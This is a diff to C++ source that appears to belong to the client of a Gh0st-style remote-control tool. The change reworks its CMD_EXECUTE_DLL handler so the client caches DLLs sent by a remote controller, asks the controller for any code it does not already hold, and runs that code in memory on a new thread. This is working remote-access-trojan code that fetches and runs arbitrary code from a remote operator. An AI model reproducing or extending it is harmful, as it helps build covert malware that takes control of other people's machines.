@@ -198,13 +198,26 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	{
 	case CMD_EXECUTE_DLL: {
 #ifdef _WIN64
+		static std::map<std::string, std::vector<BYTE>> m_MemDLL;
 		const int sz = 1 + sizeof(DllExecuteInfo);
-		if (ulLength <= sz)break;
+		if (ulLength < sz)break;
 		DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
+		const char* md5 = info->Md5;
+		auto find = m_MemDLL.find(md5);
+		if (find == m_MemDLL.end() && ulLength == sz) {
+			// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
+			m_ClientObject->Send2Server((char*)szBuffer, ulLength);
+			break;
+		}
+		BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
 		if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
+			if (md5[0]) m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
+			data = szBuffer + sz;
+		}
+		if (data) {
 			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
-			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, szBuffer + sz), 0, NULL));
-			Mprintf("Execute '%s'%d succeed: %d Length: %d\n", info->Name, info->CallType, szBuffer[1], info->Size);
+			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
+			Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
 		}
 #endif
 		break;
